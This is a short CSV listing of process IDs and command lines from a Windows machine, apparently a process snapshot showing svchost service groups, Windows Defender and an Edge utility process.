PID,Args
3012,C:\\WINDOWS\\System32\\svchost.exe -k utcsvc -p
3024,C:\\WINDOWS\\System32\\svchost.exe -k LocalServiceNoNetwork -p -s DPS
3040,C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p -s IKEEXT
3048,C:\\WINDOWS\\System32\\svchost.exe -k NetSvcs -p -s iphlpsvc
3076,C:\\WINDOWS\\System32\\svchost.exe -k LocalSystemNetworkRestricted -p -s TrkWks
3084,AggregatorHost.exe
3088,C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p -s Winmgmt
3108,C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p -s WpnService
3132,C:\\WINDOWS\\system32\\svchost.exe -k WSAIFabricSvcGroup -p -s WSAIFabricSvc
3172,"""C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25110.6-0\\MsMpEng.exe"""
3212,C:\\WINDOWS\\system32\\svchost.exe -k InvSvcGroup -p -s InventorySvc
3288,-
3384,sihost.exe
3684,C:\\WINDOWS\\System32\\svchost.exe -k LocalServiceNetworkRestricted -s RmSvc
3740,C:\\WINDOWS\\system32\\svchost.exe -k LocalSystemNetworkRestricted -p -s SensorService
3808,C:\\WINDOWS\\system32\\svchost.exe -k netsvcsRedirectionGuard -p -s lfsvc
3852,"""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"" --type=utility --utility-sub-type=storage.mojom.StorageService --lang=en-US --service-sandbox-type=service --startup-read-main-dll --metrics-shmem-handle=2220,i,18052033473365431038,17015837912476734310,524288 --field-trial-handle=2316,i,7522029994750082365,3384395441714901132,262144 --variations-seed-version --trace-process-track-uuid=3190708990060038890 --mojo-platform-channel-handle=2588 /prefetch:13"
